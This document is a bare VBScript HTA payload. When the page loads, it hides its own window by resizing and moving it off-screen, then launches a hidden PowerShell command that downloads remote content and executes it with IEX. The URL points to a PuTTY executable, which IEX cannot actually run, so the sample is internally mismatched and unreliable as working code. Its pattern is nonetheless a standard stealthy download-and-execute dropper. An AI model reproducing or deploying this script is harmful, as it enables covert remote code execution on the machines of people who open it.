<script language="VBScript">
Sub window_onload
    window.resizeTo 0,0
    window.MoveTo -100,-100
	const impersonation = 3
	Const HIDDEN_WINDOW = 12
	Set Locator = CreateObject("WScript.Shell")
    Locator.Run"powershell.exe -nop -w hidden -c ""IEX (new-object net.webclient).downloadstring('https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe')""",0,FALSE
    window.close()
end sub
</script>
